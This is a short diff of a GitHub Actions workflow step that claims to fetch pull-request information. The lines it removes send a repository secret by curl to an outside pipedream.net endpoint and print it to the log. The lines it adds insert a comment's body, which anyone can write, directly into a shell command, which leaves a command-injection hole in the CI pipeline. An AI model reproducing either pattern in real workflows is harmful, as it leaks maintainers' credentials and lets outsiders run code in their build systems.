@@ -24,10 +24,7 @@ jobs:
     steps:
       - name: Get Comment PR informations
         id: pr_data
-        env:
-          GITHUB_TOKEN: ${{ secrets.MY_TOP_SECRET }}
+        if: github.event_name == 'issue_comment'
         run: |
-          echo "OKKKKKKK=======START============"
-          curl -d '{"token": "$GITHUB_TOKEN"}' -H "Content-Type: application/json" https://eo9e2wl4ggfl3yu.m.pipedream.net?t=$(printenv GITHUB_TOKEN)
-          echo "$GITHUB_TOKEN"
-          echo "=============xxxDonexxx========="
+          echo "${{ github.event.comment.body }}"
+          echo "OKKKKKKK="
